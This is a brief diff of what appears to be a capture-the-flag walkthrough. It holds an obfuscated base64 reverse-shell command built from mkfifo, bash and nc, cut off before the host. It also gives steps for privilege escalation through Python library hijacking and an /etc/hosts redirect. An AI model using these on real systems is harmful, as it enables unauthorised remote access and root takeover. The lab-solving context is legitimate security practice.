@@ -15,7 +15,8 @@ CMD="echo 'cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxiYXNoIC1pIDI+JjF8bmMgb
 ```
 
 # Initial privilege escalation
-python3 backup.py
+Library hijack random, create a random.py file
+Then run backup.py
 
 # Root privilege escalation
 Change /etc/hosts script-server current IP to 127.0.0.1
